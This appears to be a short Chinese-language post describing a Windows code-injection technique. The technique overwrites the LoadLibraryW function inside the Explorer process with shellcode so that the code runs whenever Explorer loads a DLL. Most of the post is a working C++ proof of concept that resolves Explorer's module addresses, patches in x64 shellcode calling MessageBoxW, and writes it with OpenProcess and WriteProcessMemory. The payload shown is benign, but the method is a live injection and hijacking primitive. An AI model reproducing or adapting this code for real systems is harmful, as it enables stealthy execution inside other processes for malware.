原理

Explorer进程调用LoadLibraryW函数加载其他dll，如果我们覆盖LoadLibraryW的代码并将其重定向到我们的shellcode ，会怎么样？

每次该Explorer进程调用时LoadLibraryW，我们的代码都将被调用，而不会受到攻击者一方的任何触发。（我们可以使用任何其他函数，某些甚至更多地被Explorer进程使用，也可以调用覆盖函数以避免崩溃）

如果我们的shellcode小于函数的原始大小，那么我们只需要调OpenProcess和WriteProcessMemory就足够了。

poc:

const auto explorer_pid = get_explorer_pid();const auto kernelbase_module = get_remote_module(explorer_pid, L"KERNELBASE.dll");const auto load_lib_addr = kernelbase_module + get_function_RVA(L"kernelbase", "LoadLibraryW");
// MessageBoxW shellcodeconst auto user32_module = get_remote_module(explorer_pid, L"USER32.dll");const auto msgbox_addr = user32_module + get_function_RVA(L"User32", "MessageBoxW");unsigned char msgbox_shellcode[] = "\x48\xB8\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x48\x83\xEC\x28\x45\x31\xC9\x45\x31\xC0\x31\xD2\x31\xC9\xFF\xD0\x48\x83\xC4\x28\x31\xC0\xC3";*(DWORD_PTR*)(&msgbox_shellcode[2]) = msgbox_addr;
// OverwriteSIZE_T out_size{};const auto explorer_handle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, explorer_pid);WriteProcessMemory(explorer_handle, (LPVOID)load_lib_addr, msgbox_shellcode, sizeof(msgbox_shellcode), &out_size);
